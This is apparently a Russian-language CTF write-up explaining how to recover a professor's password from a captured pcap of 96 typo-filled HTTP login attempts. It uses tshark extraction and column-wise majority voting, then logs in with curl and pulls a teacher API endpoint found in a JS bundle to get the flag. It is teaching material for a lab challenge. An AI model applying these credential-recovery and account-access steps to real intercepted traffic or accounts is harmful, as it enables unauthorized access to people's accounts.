**Суть решения в одном абзаце.** Дамп открытого метро-Wi-Fi содержит 96 подряд неудачных попыток
логина одним и тем же пользователем — это не перебор пароля, а один и тот же секрет, 96 раз
введённый дрожащей рукой с опечатками. Опечатки независимы по позициям, поэтому пароль
восстанавливается **мажоритарным голосованием (модой) по столбцам** таблицы попыток, после чего
он подтверждается смыслом (leet-фраза «badger steals honey») и просто используется для логина.

## 1. Задача

Легенда: профессора Барсукова трясло в метро, он раз за разом мазал по клавишам и не мог войти
в СДО (систему дистанционного обучения). Весь его трафик утёк в открытый метро-Wi-Fi и попал к нам.
**Цель:** попасть в аккаунт профессора в СДО и забрать флаг.

**Дано:** `sopromed_capture.pcap` — дамп трафика.
**Боевой хост СДО:** `https://sopromed-vlrdcf4v.avitoctf.ru/`

## 2. Разведка

```bash
file sopromed_capture.pcap                       # pcap, Ethernet
capinfos sopromed_capture.pcap                    # 960 пакетов, длительность 570 с
tshark -r sopromed_capture.pcap -q -z io,phs      # иерархия протоколов
```

Наблюдения:
- encapsulation = **Ethernet** (не 802.11) — Wi-Fi уже расшифрован, прикладные данные в открытом
  виде;
- в иерархии протоколов `tcp → http → json` — HTTP-фреймы присутствуют, тело в JSON;
- **960 пакетов за 570 с**. При ~96 обменах это ≈ одна попытка каждые 6 секунд — темп человека,
  упорно перевводящего пароль, а не автоматического перебора.

```bash
tshark -r sopromed_capture.pcap -Y http.request  -T fields -e http.request.method -e http.request.uri
tshark -r sopromed_capture.pcap -Y http.response -T fields -e http.response.code
```

Результат: **96× `POST /api/auth/login`**, **96× `401 Unauthorized`**, ни одного `200`. Готового
рабочего пароля в дампе нет — все попытки провалились, пароль придётся вычислить из этих 96
промахов.

```bash
tshark -r sopromed_capture.pcap -Y http.request -T fields -e json.value.string
```

```

prof_barsukov,g4dgef_st34ld_h0mey
prof_barsukov,b4dger_zt34ks_j0jsh
prof_barsukov,b4dger_dt34ls_n0ney
prof_barsukov,v4dger_st34pa_h0bsy
...
```

## 3. Как мы вышли на решение (логика гипотез)

- **Наблюдение.** Логин везде один (`prof_barsukov`) — меняется только пароль.
  **Гипотеза** — это повторный ввод **одного** секрета одним человеком, а не перебор словаря.
  Модель угрозы за этим: если бы это был словарный брутфорс, логины/пароли не повторяли бы
  настолько похожую форму.

- **Наблюдение.** Все 96 паролей одной длины (19 символов) и одной формы —
  `XXXXXX_XX34XX_XXXXXX` — «съезжания» символов (вставки/пропуски) нет.
  **Гипотеза** — это подтверждает, что человек метил в одни и те же клавиши/позиции, а не печатал
  разные строки. Значит таблицу 96 попыток можно рассматривать как **96×19-матрицу с фиксированным
  выравниванием по столбцам** — предпосылка, без которой голосование по колонкам было бы
  бессмысленным.

- **Наблюдение.** Ошибки «плавают» по позициям: в каждой попытке испорчено немного символов, и в
  разных местах.
  **Гипотеза** — в любой отдельной позиции ошибок **меньшинство** (иначе профессор вообще не смог
  бы стабильно печатать этот пароль в жизни), значит **правильный символ встречается в этой позиции
  чаще любого одного конкретного ошибочного варианта**.
  **Проверка** — мажоритарное голосование (мода) по каждому столбцу 96×19-таблицы:

  ```python
  from collections import Counter
  lines = [l.strip().split(',')[1] for l in open('bodies.txt')]   # только пароли
  print(''.join(Counter(col).most_common(1)[0][0] for col in zip(*lines)))
  # -> b4dger_st34ls_h0ney
  ```

  Статистика подтверждает модель ошибок из легенды:

  | Тип позиции | Частота лидера |
  |---|---|
  | Цифры и `_` (поз. 1, 6, 9, 10, 13, 15) | **96/96** — по ним не промахнулся ни разу |
  | Буквы (поз. 0, 2, 4, …) | 40–61 из 96 — лидер есть всегда, с явным отрывом |

- **Тупик, которого не было, но который стоило проверить.** Перед тем как доверять моде, стоит
  спросить: а не может ли это быть совпадением шума? Проверка — **смысловая**: `b4dger`→**badger**
  (барсук ↔ «Барсуков»), `st34ls`→**steals**, `h0ney`→**honey** (мёд ↔ «Сопромёд»). Получилась
  осмысленная фраза **«badger steals honey»**, идеально попадающая в лор задачи. Статистика и
  семантика сошлись в одной точке — восстановленному паролю можно доверять, не тратя попытки логина
  вслепую на неполные гипотезы.

- **Дальше — прямой путь.** Логинимся восстановленным паролем, получаем сессию; флаг явно не в
  HTML — значит SPA дёргает JSON API, список эндпоинтов достаём из бандла, а не гадаем руками.

## 4. Уязвимость

Строго говоря, «уязвимость» здесь на стороне человека и модели ошибок ввода, а не сервера. Профессор
раз за разом набирает один и тот же пароль, промахиваясь по случайным соседним клавишам. Это
превращает 96 строк в **96 зашумлённых копий одного секрета** — классический канал с независимым
шумом по позициям, который снимается избыточностью (усреднением/голосованием по позиции). Дамп
открытого Wi-Fi просто выдал нам все эти «замеры» в открытом виде, потому что логин шёл по
незашифрованному HTTP.

## 5. Эксплойт по шагам

### Шаг 1. Извлечь пароли из HTTP-тел
```bash
tshark -r sopromed_capture.pcap -Y http.request -T fields -e json.value.string \
  | sed 's/^prof_barsukov,//' > attempts.txt
```

### Шаг 2. Восстановить пароль модой по столбцам
```bash
python3 -c "from collections import Counter;\
L=[l.split()[0] for l in open('attempts.txt')];\
print(''.join(Counter(c).most_common(1)[0][0] for c in zip(*L)))"
# -> b4dger_st34ls_h0ney
```

### Шаг 3. Логин
```bash
curl -s -c cj.txt -X POST https://sopromed-vlrdcf4v.avitoctf.ru/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"prof_barsukov","password":"b4dger_st34ls_h0ney"}'
```
→ `HTTP 200` + кука `sopromed.sid`. Ответ включает `otp_enabled:true`, но сессия выдаётся и
защищённые эндпоинты открываются **без** второго фактора (2FA в этой СДО нужна лишь для доступа к
эталонным ответам — это уже сюжет task4).

### Шаг 4. Найти и вызвать нужный API
Это React-SPA, список API не виден на страницах — достаём его из JS-бандла:
```bash
curl -sk https://sopromed-vlrdcf4v.avitoctf.ru/assets/index-CdNfEEiG.js -o bundle.js
grep -oE '"/api/[a-zA-Z0-9_/-]*"' bundle.js | sort -u
```
Среди эндпоинтов — преподавательский `/api/teacher/dashboard`:
```bash
curl -s -b cj.txt https://sopromed-vlrdcf4v.avitoctf.ru/api/teacher/dashboard
```
Флаг лежит в поле `flag_note` JSON-ответа.

Воспроизведение целиком — `task3/solve_task3.py` (см. §8).

## 7. Выводы

1. **Главное — не инструмент, а вывод.** Ключ к задаче — понять, что 96 «мусорных» строк это **не**
   перебор словаря, а зашумлённые копии одного пароля с фиксированным выравниванием по позициям.
2. **Шум с независимыми ошибками снимается статистикой, а не гаданием.** Мода по столбцам — это
   ремонт с исправлением ошибок через избыточность (мажоритарное голосование), классика теории
   информации, применённая к человеческим опечаткам.
3. **Два независимых подтверждения надёжнее одного.** Статистика (мода) и семантика (осмысленная
   leet-фраза) совпали ещё до похода на сервер — это резко снижает риск потратить попытку логина
   впустую.
4. **Открытый Wi-Fi = открытый HTTP.** Пароль в теле POST виден любому, кто снимает трафик; сам факт
   незашифрованного логина и подарил все 96 «замеров» секрета.
